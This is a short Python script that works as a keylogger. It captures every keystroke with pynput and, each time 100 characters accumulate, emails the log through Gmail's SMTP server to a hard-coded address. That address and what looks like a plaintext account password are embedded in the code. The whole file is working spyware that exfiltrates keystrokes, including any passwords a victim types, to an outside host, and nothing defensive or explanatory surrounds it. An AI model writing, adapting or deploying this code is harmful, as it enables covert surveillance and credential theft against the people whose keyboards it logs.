from email.mime.text import MIMEText
from pynput.keyboard import Listener
from datetime import datetime
import smtplib
from email.mime.multipart import MIMEMultipart


email = "kreamkatz@gmail.com"
password = "sanyamjain"
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)

def login_email():
    global server   
    server.login(email, password)


# Global vars
MASTER_LOG = ''
CHAR_LIMIT = 100

def on_press(key):
    global MASTER_LOG
    global CHAR_LIMIT

    MASTER_LOG += str(key)+'\n'

    if len(MASTER_LOG) >= CHAR_LIMIT:
        message = MIMEMultipart()
        message['From'] = email
        message['To'] = email
        message['Subject'] = str(datetime.now())
        message.attach(MIMEText(MASTER_LOG))
        try:
            server.sendmail(email, email, message.as_string())
        except Exception:
            login_email()
            server.sendmail(email, email, message.as_string())
        MASTER_LOG = ''
    
 
with Listener(on_press=on_press) as listener :
    listener.join()
